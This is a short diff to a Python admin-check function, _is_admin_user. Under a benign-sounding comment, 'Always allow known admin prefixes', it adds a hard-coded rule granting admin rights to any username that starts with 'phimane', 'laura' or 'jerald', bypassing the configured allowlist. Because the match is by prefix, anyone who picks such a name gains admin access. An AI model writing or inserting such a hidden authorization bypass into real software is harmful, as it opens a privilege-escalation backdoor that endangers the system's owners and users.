@@ -155,13 +155,17 @@ def _normalize_username(username: str) -> str:
 
 
 def _is_admin_user(username: str) -> bool:
-  # Backward-compatible default: if allowlist is not configured, do not restrict.
-  if not ADMIN_USERS:
-    return True
-
   normalized = _normalize_username(username)
   if not normalized:
     return False
+
+  # Always allow known admin prefixes.
+  if normalized.startswith("phimane") or normalized.startswith("laura") or normalized.startswith("jerald"):
+    return True
+
+  # Backward-compatible default: if allowlist is not configured, do not restrict.
+  if not ADMIN_USERS:
+    return True
 
   return normalized in ADMIN_USERS
 
